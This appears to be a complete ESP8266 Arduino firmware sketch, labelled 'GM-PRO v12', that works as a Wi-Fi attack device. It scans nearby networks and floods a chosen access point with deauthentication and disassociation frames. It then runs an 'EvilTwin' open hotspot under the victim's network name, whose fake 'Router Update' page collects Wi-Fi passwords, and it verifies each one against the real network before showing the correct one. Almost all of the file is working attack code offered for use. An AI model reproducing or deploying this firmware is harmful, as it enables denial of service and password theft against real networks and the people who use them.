#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

// Inisialisasi OLED 0.66" (64x48)
Adafruit_SSD1306 display(64, 48, &Wire, -1);

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

// Helper: MAC Address ke String
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// --- TAMPILAN OLED PROFESIONAL ---
void updateOLED(String status) {
  display.clearDisplay();
  display.fillRect(0, 0, 64, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 1); display.print("GM-PRO v12");
  
  display.setTextColor(WHITE);
  display.setCursor(0, 14); display.print("T>"); 
  display.print(_selectedNetwork.ssid == "" ? "NONE" : _selectedNetwork.ssid.substring(0, 6));

  for(int i=0; i<64; i+=4) display.drawFastHLine(i, 24, 2, WHITE);

  display.setCursor(0, 28); display.print("CH:"); display.print(_selectedNetwork.ch);
  display.setCursor(35, 28); display.print("ATK:"); display.print(deauthing_active ? "Y" : "N");

  display.drawRoundRect(0, 37, 64, 11, 2, WHITE);
  display.setCursor(4, 39); display.print(status.substring(0, 9));
  display.display();
}

void clearArray() {
  for (int i = 0; i < 16; i++) { _networks[i] = _Network(); }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      memcpy(network.bssid, WiFi.BSSID(i), 6);
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
  updateOLED("SCANNED");
}

// --- WEB HANDLERS ---
void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script></head><body><h2>Wrong Password</h2><p>Please try again.</p></body></html>");
    updateOLED("WRONG PW");
  } else {
    webServer.send(200, "text/html", "<html><body><h2>Success</h2><p>Connection Restored.</p></body></html>");
    _correct = "SUCCESS! SSID: " + _selectedNetwork.ssid + " | PW: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    WiFi.softAPdisconnect(true);
    WiFi.softAP("GMpro", "sangkur87");
    updateOLED("PWN!");
    Serial.println(_correct);
  }
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
    updateOLED(deauthing_active ? "DEAUTH" : "READY");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      WiFi.softAPdisconnect(true);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      updateOLED("ETWIN ON");
    } else {
      hotspot_active = false;
      WiFi.softAPdisconnect(true);
      WiFi.softAP("GMpro", "sangkur87");
      updateOLED("READY");
    }
  }

  if (hotspot_active == false) {
    String _html = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1.0'><style>body{background:#000;color:#0f0;font-family:monospace;}table{width:100%;border:1px solid #0f0;}td{padding:5px;border:1px solid #222;}.btn{display:inline-block;padding:10px;background:#0f0;color:#000;text-decoration:none;margin:5px;}</style></head><body>";
    _html += "<h3>GMpro - NETHERCORE</h3>";
    _html += "<div><a class='btn' href='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>" + String(deauthing_active ? "Stop Deauth" : "Start Deauth") + "</a>";
    _html += "<a class='btn' href='/?hotspot=" + String(hotspot_active ? "stop" : "start") + "'>Start EvilTwin</a></div><br><table>";
    
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      _html += "<tr><td>" + _networks[i].ssid + "</td><td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "' style='color:#fff;'>[SELECT]</a></td></tr>";
    }
    _html += "</table><p>" + _correct + "</p></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<html><script>setTimeout(function(){window.location.href='/result';},10000);</script><body><h2>Verifying...</h2></body></html>");
    } else {
      webServer.send(200, "text/html", "<html><body><h2>Router Update</h2><form action='/'><input type='password' name='password' minlength='8'><input type='submit' value='Update'></form></body></html>");
    }
  }
}

void setup() {
  Serial.begin(115200);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "sangkur87");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  
  updateOLED("BOOT OK");
  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 500) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    deauthPacket[0] = 0xA0; // Disassociate
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    
    deauth_now = millis();
    // Kembali ke channel 1 sebentar agar web server tidak lag
    wifi_set_channel(1);
  }

  if (millis() - now >= 20000 && !deauthing_active && !hotspot_active) {
    performScan();
    now = millis();
  }
}
